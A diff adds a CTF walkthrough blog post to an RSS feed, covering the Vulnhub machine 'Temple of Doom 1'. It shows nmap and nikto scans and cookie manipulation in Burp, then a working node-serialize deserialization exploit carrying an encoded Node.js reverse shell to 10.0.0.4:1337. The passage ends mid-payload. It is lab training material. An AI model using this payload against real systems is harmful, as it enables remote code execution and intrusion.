@@ -7,6 +7,486 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Vulnhub.com - Temple Of Doom 1</title>
+        <description>&lt;p&gt;Today we’re going to walk through  very cool machine from Vulnhub called &lt;strong&gt;&lt;em&gt;Temple of Doom&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[+] A CTF created by https://twitter.com/0katz
+[+] Difficulty: Easy/Intermediate
+[+] Tested in VirtualBox
+[+] Note: 2 ways to get root!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Author: &lt;a href=&quot;https://twitter.com/0katz&quot;&gt;0katz&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/temple-of-doom-1,243/&quot;&gt;https://www.vulnhub.com/entry/temple-of-doom-1,243/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Big thanks to the author for creating this challenge and for Vulnhub for hosting and curating this great set of machines!&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Firstly, as always we’re going to start with the &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;-v&lt;/em&gt; - verbose output&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-sS&lt;/em&gt; - TCP-SYN scan&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-A&lt;/em&gt; - OS detection, version detection and traceroute&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-T4&lt;/em&gt; - aggresive scan&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 10.0.0.5
+Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-07-11 11:17 EDT
+NSE: Loaded 148 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 11:17
+Completed NSE at 11:17, 0.00s elapsed
+Initiating NSE at 11:17
+Completed NSE at 11:17, 0.00s elapsed
+Initiating ARP Ping Scan at 11:17
+Scanning 10.0.0.5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
+Completed ARP Ping Scan at 11:17, 0.03s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating Parallel DNS resolution of 1 host. at 11:17
+Completed Parallel DNS resolution of 1 host. at 11:17, 0.00s elapsed
+Initiating SYN Stealth Scan at 11:17
+Scanning 10.0.0.5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1000 ports]
+Discovered open port 22/tcp on 10.0.0.5
+Discovered open port 666/tcp on 10.0.0.5
+Completed SYN Stealth Scan at 11:17, 0.12s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1000 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating Service scan at 11:17
+Scanning 2 services on 10.0.0.5
+Completed Service scan at 11:17, 11.04s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.0.5&lt;/span&gt;
+NSE: Script scanning 10.0.0.5.
+Initiating NSE at 11:17
+Completed NSE at 11:17, 1.18s elapsed
+Initiating NSE at 11:17
+Completed NSE at 11:17, 0.00s elapsed
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.5
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00062s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 95:68:04:c7:42:03:04:cd:00:4e:36:7e:cd:4f:66:ea &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 c3:06:5f:7f:17:b6:cb:bc:79:6b:46:46:cc:11:3a:7d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 63:0c:28:88:25:d5:48:19:82:bb:bd:72:c6:6c:68:50 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+666/tcp open  http    Node.js Express framework
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=utf-8).
+MAC Address: 08:00:27:BB:24:1C (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Uptime guess: 34.945 days (since Wed Jun  6 12:36:17 2018)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.62 ms 10.0.0.5
+
+NSE: Script Post-scanning.
+Initiating NSE at 11:17
+Completed NSE at 11:17, 0.00s elapsed
+Initiating NSE at 11:17
+Completed NSE at 11:17, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds
+           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;At the start I decided to check out port &lt;code class=&quot;highlighter-rouge&quot;&gt;666&lt;/code&gt; running &lt;code class=&quot;highlighter-rouge&quot;&gt;NodeJS Express&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# curl 10.0.0.5:666
+Under Construction, Come Back Later!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As the content of the website doesn’t tell us much, I decided to run &lt;code class=&quot;highlighter-rouge&quot;&gt;nikto&lt;/code&gt; scan in the background.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.0.0.5:666
+- Nikto v2.1.6
+&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
++ Target IP:          10.0.0.5
++ Target Hostname:    10.0.0.5
++ Target Port:        666
++ Start Time:         2018-07-11 11:19:05 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
++ Server: No banner retrieved
++ Retrieved x-powered-by header: Express
++ Server leaks inodes via ETags, header found with file /, fields: 0xW/24 0xxWt5IUP3GfGbHraPgY5EGPpcNzA 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
++ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Allowed HTTP Methods: GET, HEAD 
++ ERROR: Error limit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reached &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host, giving up. Last error: error reading HTTP response
++ Scan terminated:  20 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 6 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
++ End Time:           2018-07-11 11:19:35 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;30 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
++ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;In the meantime, while manually looking around at the webiste, I’ve noticed that at the second visit we get different content. In burpsuite we can also notice a profile cookie.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;GET / HTTP/1.1
+Host: 10.0.0.5:666
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: profile=eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZnMzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOkZyaWRheSwgMTMgT2N0IDIwMTggMDA6MDA6MDAgR01UIn0%3D
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+HTTP/1.1 500 Internal Server Error
+X-Powered-By: Express
+Content-Security-Policy: default-src 'self'
+X-Content-Type-Options: nosniff
+Content-Type: text/html; charset=utf-8
+Content-Length: 1155
+Date: Wed, 11 Jul 2018 15:21:14 GMT
+Connection: close
+
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;SyntaxError: Unexpected token F in JSON at position 79&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at JSON.parse (&lt;span class=&quot;ni&quot;&gt;&amp;amp;lt;&lt;/span&gt;anonymous&lt;span class=&quot;ni&quot;&gt;&amp;amp;gt;&lt;/span&gt;)&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at Object.exports.unserialize (/home/nodeadmin/.web/node_modules/node-serialize/lib/serialize.js:62:16)&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at /home/nodeadmin/.web/server.js:12:29&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at next (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:137:13)&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at Route.dispatch (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:112:3)&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at /home/nodeadmin/.web/node_modules/express/lib/router/index.js:281:22&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at Function.process_params (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:335:12)&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at next (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:275:10)&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As the cookie is &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; encoded let’s decode it.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;csrftoken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;u32t4o3tb3gg431fs34ggdgchjwnza0l=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Expires=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Friday&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Oct&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2018&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;GMT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;In addition we get the &lt;code class=&quot;highlighter-rouge&quot;&gt;unexpected token&lt;/code&gt; error,  let’s fix it by adding quotation marks at the start of the date.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;csrftoken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;u32t4o3tb3gg431fs34ggdgchjwnza0l=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Expires=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Friday, 13 Oct 2018 00:00:00 GMT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Sending it with repeater in BurpSuite, we immediately  notice that the content of the website is correctly rendered.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;GET / HTTP/1.1
+Host: 10.0.0.5:666
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: profile=eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZnMzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOiJGcmlkYXksIDEzIE9jdCAyMDE4IDAwOjAwOjAwIEdNVCJ9
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: text/html; charset=utf-8
+Content-Length: 11
+ETag: W/&quot;b-GWZKb4joaEb2aqpBlbdbhMNzgtI&quot;
+Date: Wed, 11 Jul 2018 15:23:09 GMT
+Connection: close
+
+Hello Admin&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;But this brings another attack vector that I remember from another machine - bug in &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize&lt;/code&gt; function in NodeJS leading to remote code execution. You can read more &lt;a href=&quot;https://blog.websecurify.com/2017/02/hacking-node-serialize.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Firstly, let’s create a reverse shell using this &lt;a href=&quot;https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py&quot;&gt;nodejsshell.py&lt;/a&gt; with our IP and port to connect.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# python js-reverseshell.py 10.0.0.4 1337
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] LHOST &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 10.0.0.4
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] LPORT &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1337
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Encoding
+&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;String.fromCharCode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,48,46,48,46,52,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we’re ready to add it into the cookie.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;csrftoken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;u32t4o3tb3gg431fs34ggdgchjwnza0l=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Expires=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Friday, 13 Oct 2018 00:00:00 GMT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rce&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,48,46,48,46,52,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,1